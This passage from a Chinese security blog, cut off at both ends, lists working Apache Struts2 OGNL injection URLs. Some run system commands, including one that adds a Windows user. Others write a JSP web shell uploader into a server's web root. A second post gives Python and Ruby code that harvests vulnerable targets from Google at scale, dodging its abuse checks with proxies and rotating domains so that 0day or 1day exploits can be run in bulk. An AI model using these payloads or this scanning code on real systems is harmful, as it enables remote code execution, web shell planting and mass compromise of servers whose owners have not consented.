class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i95)((<span class="string">'\43xman.getWriter().println(\43webStr12)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'</span>&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&amp;z[(user.loginname)(<span class="string">'meh'</span>)]=<span class="literal">true</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;cmd=cmd%20/c%20netstat%20-an</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()&#125;</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/struts2-blank/example/HelloWorld.action?redirect:<span class="variable">$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'netstat','-an'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"net user selina 123 /add"</span>);</div></pre></td></tr></table></figure></p>
<p>就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl extends Process也是Process的具体实现。而命令执行后返回的Process可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public OutputStream getOutputStream()</div><div class="line">public InputStream getInputStream()</div></pre></td></tr></table></figure></p>
<p>直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Process java.lang.Runtime.exec(String <span class="built_in">command</span>) throws IOException</div></pre></td></tr></table></figure></p>
<p>#####GetShell<br>poc1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&amp;(i1)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(i12)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i13)((<span class="string">'\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))'</span>)(d))&amp;(i2)((<span class="string">'\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())'</span>)(d))&amp;(i3)((<span class="string">'\43fos.write(\43req.getParameter(%22p%22).getBytes())'</span>)(d))&amp;(i4)((<span class="string">'\43fos.close()'</span>)(d))&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'</span>%20&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc5:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()&#125;</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc6:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()&#125;</span>&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cjbohpb4n000i7o1b1mno70bl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-利用大数据进行攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/15/利用大数据进行攻击/" class="article-date">
  <time datetime="2017-01-15T11:14:09.000Z" itemprop="datePublished">2017-01-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/15/利用大数据进行攻击/">利用大数据进行攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>我们在日常的威胁响应中，常常需要定义当前漏洞的危害程度，通常我们是通过某漏洞应用的使用量来判定。但是使用量怎么判断也没有一个准确的说法，一般来说我们通过构造语法去搜索引擎搜索该应用的搜索结果数，并以此为根据来判断一个漏洞是否严重。</p>
<p>不仅如此，试想，假如我们手握一个0day或者刚公开的1day漏洞的exp时，如何最大化这个漏洞的价值呢？</p>
<p>这个时候我们就需要利用该漏洞去批量检测或利用，批量的数据一般来自搜索引擎（Google、Bing、Baidu）、开放的网络信息搜索引擎（FOFA、ZoomEye、Shodan）等。</p>
<p>下面将就这几个方法一个个分析数据获取和利用方式。</p>
<h3 id="0x01-利用Google"><a href="#0x01-利用Google" class="headerlink" title="0x01 利用Google"></a>0x01 利用Google</h3><p>如果我们能够掌握一个应用的具体搜索语法，则可以利用该语法去搜索引擎中批量检索匹配的应用，再从中提取出URL，放入扫描器里批量扫描，检测是否存在漏洞：</p>
<p><img src="/upload_image/Dashuju-1.jpg" alt=""></p>
<p>但是搜索引擎也有其缺点，当我们的扫描器批量检索时，可能会触发恶意搜索检查。比如Google会对同一IP的批量搜索报警，报警后必须通过验证码验证才能继续搜索：</p>
<p><img src="/upload_image/Dashuju-2.jpg" alt=""></p>
<p>因此想要批量利用搜索引擎，只有先想办法逃避搜索引擎的恶意搜索检查。在Google里，我能想到的绕过方法有两个：</p>
<ol>
<li>利用代理出口，通过更换IP的方式逃避Google的源IP检查</li>
<li>利用Google众多子域名（.hk .jp .co）分布搜索</li>
</ol>
<p>将这两种绕过方式结合之后，我们就可以尝试搜索大一点的数据量了，python实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=gbk</span></div><div class="line"><span class="keyword">from</span> google <span class="keyword">import</span> search</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"></div><div class="line">proxy = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1:8087'</span>&#125;)</div><div class="line">opener = urllib2.build_opener(proxy)</div><div class="line">urllib2.install_opener(opener)</div><div class="line"></div><div class="line">target_lists = []</div><div class="line">google_sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">targets = open(<span class="string">'lists'</span>, <span class="string">'r'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> targets:</div><div class="line">        query = <span class="string">'intitle:皇冠国际 AND site:%s'</span> % line</div><div class="line"></div><div class="line">        site = google_sites[random.randint(<span class="number">0</span>, len(google_sites) - <span class="number">1</span>)]</div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"[*] Using google.%s and checking %s"</span> % (site, line)</div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> search(query, site, stop = <span class="number">1</span>):</div><div class="line">                        <span class="keyword">print</span> <span class="string">"[+] hacked: %s"</span> % url</div><div class="line"></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>ruby：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Google</span></span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(query, proxy = <span class="literal">nil</span>)</span></span></div><div class="line">        @query = query</div><div class="line">        @proxy = proxy</div><div class="line">        @sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">        @result = []</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(stop = <span class="number">50</span>)</span></span></div><div class="line">        site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">        page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">        start_index = <span class="number">0</span> <span class="comment"># page count</span></div><div class="line"></div><div class="line">        url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line"></div><div class="line">        result_count = <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="keyword">begin</span></div><div class="line">            <span class="keyword">if</span> @proxy.<span class="literal">nil</span>?</div><div class="line">                response = Typhoeus.get(url, <span class="symbol">followlocation:</span> <span class="literal">true</span>, <span class="symbol">cache_ttl:</span> <span class="number">500</span>)</div><div class="line">            <span class="keyword">else</span></div><div class="line">                response = Typhoeus.get(</div><div class="line">                    url,</div><div class="line">                    <span class="symbol">proxy:</span> @proxy,</div><div class="line">                    <span class="symbol">proxytype:</span> <span class="string">"socks5"</span>,</div><div class="line">          <span class="symbol">followlocation:</span> <span class="literal">true</span>,</div><div class="line">          <span class="symbol">cache_ttl:</span> <span class="number">500</span></div><div class="line">                )</div><div class="line">            <span class="keyword">end</span></div><div class="line"></div><div class="line">            @result += parse_result(response.body)</div><div class="line"></div><div class="line">            result_count += page_count</div><div class="line"></div><div class="line">            site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">            page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">            start_index += result_count <span class="comment"># page count</span></div><div 